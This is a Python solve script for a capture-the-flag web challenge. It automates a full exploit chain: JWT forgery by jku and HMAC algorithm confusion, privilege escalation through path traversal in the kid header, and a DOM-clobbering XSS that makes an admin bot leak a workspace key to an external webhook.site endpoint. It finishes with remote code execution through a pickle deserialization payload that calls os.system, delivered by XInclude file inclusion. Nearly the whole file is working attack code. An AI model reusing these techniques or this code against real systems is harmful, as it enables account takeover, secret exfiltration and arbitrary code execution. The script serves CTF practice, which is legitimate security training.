#!/usr/bin/env python3
"""
Perimeter Drift CTF - Solve
Chain: SSO JWT forgery -> Reviewer escalation -> Bot workspace_key leak -> Pickle RCE
"""
import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import sys
import time
import urllib.parse

import requests

TARGET = "http://chall.0xfun.org:59544"

HMAC_KEY = "mysecretkey"

# Possible TARGET_BASE values the bot might use
BOT_TARGETS = [
    "http://web:5000",
    "http://host.docker.internal:5000",
    "http://host.docker.internal:59544",
    "http://localhost:5000",
    "http://127.0.0.1:5000",
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    k = key if isinstance(key, bytes) else key.encode()
    sig = hmac.new(k, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_jku_url():
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64 = base64.b64encode(jwks.encode()).decode()
    return f"https://httpbin.org/base64/{urllib.parse.quote(b64, safe='')}"


def make_pickle_payload():
    class Exploit:
        def __reduce__(self):
            return (os.system, ('cp /flag.txt /shared/loot/flag.txt 2>/dev/null; cat /flag* > /shared/loot/flag.txt 2>/dev/null',))
    return pickle.dumps(Exploit())


def sso_login(s):
    print("[1] SSO JWT Forgery (jku + HMAC confusion)...")
    jku_url = make_jku_url()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher",
        "email": "nora.vale@drift.com",
        "name": "Nora Vale",
        "iss": "https://sso.partner.local",
        "aud": "perimeter-drift-web",
        "exp": now + 3600,
        "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    r = s.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True)
    print(f"    SSO callback: {r.status_code}")
    r = s.get(f"{TARGET}/api/me")
    if r.status_code == 200:
        me = r.json()
        print(f"    Logged in as: {me['username']} (role: {me['role']})")
        return me
    print(f"    Login failed: {r.status_code} {r.text[:200]}")
    return None


def escalate_reviewer(s):
    print("\n[2] Reviewer Escalation (path traversal in kid)...")
    known_key = b"EXPLOIT_KEY"
    files = {"file": ("exploit.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files)
    print(f"    Upload: {r.status_code} {r.text}")
    if r.status_code != 200:
        return False
    fname = r.json().get("filename", "exploit.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname
    kid = f"../review-materials/{kid_name}"
    grant = forge_jwt(known_key, {
        "scope": "report:submit",
        "iat": int(time.time())
    }, {"kid": kid})
    r = s.post(f"{TARGET}/review/escalate", data={"grant": grant}, allow_redirects=True)
    print(f"    Escalation: {r.status_code}")
    r = s.get(f"{TARGET}/api/me")
    if r.status_code == 200:
        me = r.json()
        print(f"    Current role: {me['role']}")
        return me['role'] in ('reviewer', 'admin')
    return False


def create_report(s, jku_url):
    print("\n[3] Creating report with DOM clobbering payload...")
    s2 = requests.Session()
    now = int(time.time())
    token = forge_jwt(HMAC_KEY, {
        "sub": "researcher",
        "email": "nora.vale@drift.com",
        "name": "Nora Vale",
        "iss": "https://sso.partner.local",
        "aud": "perimeter-drift-web",
        "exp": now + 3600,
        "iat": now
    }, {"kid": "partner-main", "jku": jku_url})
    s2.get(f"{TARGET}/sso/callback", params={"id_token": token}, allow_redirects=True)
    body = '<form id="workspace-state"><input name="state" value=\'{"debug":true,"module":"ops/loader"}\'></form>'
    r = s2.post(f"{TARGET}/reports/new", data={
        "title": "Security Assessment",
        "vuln_type": "XSS",
        "report": body
    }, allow_redirects=True)
    m = re.search(r'/reports/(\d+)', r.url)
    if m:
        rid = m.group(1)
        print(f"    Report ID: {rid}")
        return rid
    r = s2.get(f"{TARGET}/reports")
    m = re.search(r'/reports/(\d+)', r.text)
    if m:
        rid = m.group(1)
        print(f"    Report ID (from list): {rid}")
        return rid
    print("    Failed to get report ID")
    return "1"


def do_rce(workspace_key):
    print(f"\n[5] Pickle RCE with workspace_key: {workspace_key}")
    pickle_payload = make_pickle_payload()
    b64_payload = base64.b64encode(pickle_payload).decode()

    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    r = requests.post(f"{TARGET}/admin/upload", files=files,
                      headers={"X-Workspace-Key": workspace_key})
    print(f"    Upload: {r.status_code} {r.text}")

    xml = ('<doc sink="http://internal:9000/internal/import" '
           'xmlns:drift="http://www.w3.org/2001/XInclude">'
           '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/>'
           '</doc>')
    r = requests.post(f"{TARGET}/admin/xml/import", data={"xml": xml},
                      headers={"X-Workspace-Key": workspace_key})
    print(f"    XML import: {r.status_code} {r.text}")


def check_flag():
    r = requests.get(f"{TARGET}/recovery/latest", timeout=10)
    return r.text


def solve():
    print(f"Target: {TARGET}")
    print("=" * 60)

    # Check if flag already available
    flag = check_flag()
    print(f"Recovery check: {flag}")
    if "0xfun{" in flag:
        print(f"\nFLAG: {flag}")
        return

    # Step 1: SSO login
    s = requests.Session()
    me = sso_login(s)
    if not me:
        print("FAILED: SSO login")
        return

    # Step 2: Escalate to reviewer
    if me.get("role") == "researcher":
        if not escalate_reviewer(s):
            print("FAILED: Reviewer escalation")
            return

    # Step 3: Create report with DOM clobber
    jku_url = make_jku_url()
    rid = create_report(s, jku_url)

    # Step 4: Create webhook and submit bot URLs
    print("\n[4] Creating webhook and submitting bot URLs...")
    try:
        wr = requests.post("https://webhook.site/token", timeout=10)
        if wr.status_code in (200, 201):
            wh_data = wr.json()
            wh_uuid = wh_data["uuid"]
            wh_url = f"https://webhook.site/{wh_uuid}"
            print(f"    Webhook: {wh_url}")
        else:
            print(f"    webhook.site returned {wr.status_code}, using fallback UUID")
            wh_uuid = None
            wh_url = None
    except Exception as e:
        print(f"    webhook.site error: {e}")
        wh_uuid = None
        wh_url = None

    if not wh_url:
        print("    FAILED: Could not create webhook")
        return

    # Submit bot URLs - direct admin bounce to webhook
    for tb in BOT_TARGETS:
        url = f"{tb}/admin?bounce=1&cb={urllib.parse.quote(wh_url, safe='')}"
        r = s.post(f"{TARGET}/report", data={"url": url}, allow_redirects=True)
        status = "queued" if "queued" in r.text.lower() or "validation request" in r.text.lower() else "unknown"
        print(f"    Bot -> {tb}: {status}")

    # Also try report-based XSS chain for same-origin approach
    for tb in BOT_TARGETS:
        report_url = f"{tb}/reports/{rid}?view=../../assets/admin/roles&cb={urllib.parse.quote(wh_url, safe='')}"
        r = s.post(f"{TARGET}/report", data={"url": report_url}, allow_redirects=True)
        print(f"    Bot XSS -> {tb}: submitted")

    # Poll webhook
    print(f"\n    Polling webhook for workspace_key (40s)...")
    wk = None
    for i in range(20):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{wh_uuid}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = data.get("total", 0)
                if total > 0:
                    print(f"    Got {total} webhook requests!")
                    for req in data.get("data", []):
                        url_str = req.get("url", "")
                        query = req.get("query", {})
                        print(f"      URL: {url_str[:120]}")
                        if query.get("workspace_key"):
                            wk = query["workspace_key"]
                            break
                        m = re.search(r'workspace_key=([^&]+)', url_str)
                        if m:
                            wk = urllib.parse.unquote(m.group(1))
                            break
                    if wk:
                        break
        except Exception:
            pass
        if (i + 1) % 5 == 0:
            print(f"    Still waiting... ({(i+1)*2}s)")

    if wk:
        print(f"\n[+] Got workspace_key: {wk}")
        do_rce(wk)
        time.sleep(3)
        flag = check_flag()
        print(f"\n{'='*60}")
        print(f"FLAG: {flag}")
        print(f"{'='*60}")
    else:
        print("\n[-] No workspace_key received from bot")
        # Check flag anyway
        flag = check_flag()
        print(f"Recovery: {flag}")


if __name__ == "__main__":
    solve()
